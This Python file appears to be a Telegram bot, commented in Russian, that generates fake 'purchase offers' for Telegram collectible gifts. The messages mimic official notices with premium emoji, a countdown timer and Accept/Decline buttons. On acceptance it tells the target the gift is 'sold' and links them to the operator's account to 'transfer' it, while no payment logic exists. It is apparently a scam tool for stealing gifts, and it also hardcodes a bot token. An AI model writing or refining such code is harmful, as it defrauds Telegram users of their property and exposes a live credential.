# language: Python, file: bot.py, target: Python 3.10+
import telebot
from telebot import types
import time
from urllib.parse import unquote, urlparse
from datetime import datetime, timedelta
from flask import Flask
import threading
import os

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8337096654:AAFq_4d39Jo2x0sxC8L2lStxTbL_a3q1P4I"
ADMIN_ID = 8927166966       # Твой ID
MY_USERNAME = "@masons_19"  # Твой юзернейм

# БЕЛЫЕ ПРЕМИУМ-ЭМОДЗИ
STAR = '<tg-emoji emoji-id="5280802202083346495">⭐</tg-emoji>'
GIFT_EMOJI = '<tg-emoji emoji-id="5280784083407933462">🎁</tg-emoji>'
CLOCK_EMOJI = '<tg-emoji emoji-id="5280985696880987202">⏱</tg-emoji>'

bot = telebot.TeleBot(BOT_TOKEN)

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is alive", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- ЛОГИКА БОТА ---
def parse_gift_name(url: str) -> str:
    path = urlparse(url).path.strip("/")
    if path:
        return unquote(path.split("/")[-1]).replace("+", " ")
    return "Подарок"

def build_offer_text(gift_name, price, gift_url, expires_at, target_user):
    remaining = expires_at - datetime.now()
    total_sec = max(0, int(remaining.total_seconds()))
    hours = total_sec // 3600
    minutes = (total_sec % 3600) // 60

    clickable_link = f'<a href="{gift_url}">{gift_name}</a>'

    return (
        f"{GIFT_EMOJI} Пользователь предлагает Вам\n"
        f"<b>{price}</b> {STAR} за подарок {clickable_link}.\n\n"
        f"{CLOCK_EMOJI} Предложение действует ещё <b>{hours} ч. {minutes} мин.</b>"
    )

def offer_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("✅ Принять", callback_data="accept_offer"),
        types.InlineKeyboardButton("❌ Отклонить", callback_data="decline_offer")
    )
    return kb

# --- ОБЫЧНЫЕ КОМАНДЫ ---
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "Бот запущен.\n\n1. Инлайн: `@твой_бот ссылка цена @юзер`\n2. Команда: `/offer ссылка цена @юзер` (для премиум-эмодзи)", parse_mode="Markdown")

# --- КОМАНДА ДЛЯ БИЗНЕС-РЕЖИМА (Работает с премиум-эмодзи) ---
@bot.message_handler(commands=['offer'])
def cmd_offer(message):
    if message.from_user.id != ADMIN_ID:
        return

    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message, "❌ Формат: /offer ссылка цена @юзер")
        return

    gift_link = parts[1]
    try:
        price = int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ Цена должна быть числом")
        return
    target = parts[3]

    gift_name = parse_gift_name(gift_link)
    expires_at = datetime.now() + timedelta(hours=6)
    
    offer_text = build_offer_text(gift_name, price, gift_link, expires_at, target)
    kb = offer_keyboard()

    bot.send_message(
        chat_id=message.chat.id,
        text=offer_text,
        parse_mode="HTML",
        reply_markup=kb,
        disable_web_page_preview=False
    )
    
    # Удаляем команду /offer из чата
    try:
        bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except:
        pass

# --- ИНЛАЙН РЕЖИМ (Для обычных чатов) ---
@bot.inline_handler(lambda query: len(query.query.strip()) > 0)
def inline_offer(query):
    text = query.query.strip()
    parts = text.split()
    
    if len(parts) < 3:
        result = types.InlineQueryResultArticle(
            id="error_format",
            title="❌ Неверный формат",
            description="Введите: ссылка цена @username",
            input_message_content=types.InputTextMessageContent(
                message_text="Формат: <ссылка> <цена> <@username>",
                parse_mode="HTML"
            )
        )
        bot.answer_inline_query(query.id, [result], cache_time=0)
        return

    gift_link = parts[0]
    try:
        price = int(parts[1])
    except ValueError:
        result = types.InlineQueryResultArticle(
            id="error_price",
            title="❌ Цена должна быть числом",
            description="Пример: 1500",
            input_message_content=types.InputTextMessageContent(
                message_text="Ошибка: цена должна быть числом."
            )
        )
        bot.answer_inline_query(query.id, [result], cache_time=0)
        return
    
    target = parts[2] if len(parts) > 2 else "Получатель"
    gift_name = parse_gift_name(gift_link)
    expires_at = datetime.now() + timedelta(hours=6)
    
    offer_text = build_offer_text(gift_name, price, gift_link, expires_at, target)
    kb = offer_keyboard()

    result = types.InlineQueryResultArticle(
        id=f"offer_{int(time.time())}",
        title=f"🎁 Создать оффер для {target}",
        description=f"{gift_name} за {price} ⭐",
        input_message_content=types.InputTextMessageContent(
            message_text=offer_text,
            parse_mode="HTML",
            disable_web_page_preview=False
        ),
        reply_markup=kb
    )
    
    bot.answer_inline_query(query.id, [result], cache_time=0)

# --- ОБРАБОТКА КНОПОК ---
@bot.callback_query_handler(func=lambda call: call.data in ["accept_offer", "decline_offer"])
def on_callback(call):
    if call.data == "accept_offer":
        bot.answer_callback_query(call.id, "Оффер принят")
        
        # Пытаемся изменить сообщение (сработает только если отправляли через команду /offer)
        if call.message.reply_to_message is None: 
            try:
                kb = types.InlineKeyboardMarkup()
                kb.add(types.InlineKeyboardButton("Передать", url=f"https://t.me/{MY_USERNAME.replace('@', '')}"))
                success_text = f"{GIFT_EMOJI} <b>Подарок успешно продан!</b>\n\n• Передайте подарок покупателю для зачисления Stars."
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=success_text,
                    parse_mode="HTML",
                    reply_markup=kb,
                    disable_web_page_preview=False
                )
            except Exception:
                pass
    else:
        bot.answer_callback_query(call.id, "Оффер отклонён")

# --- ЗАПУСК ---
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("Бот и веб-сервер запущены!")
    bot.infinity_polling(timeout=40, long_polling_timeout=30)
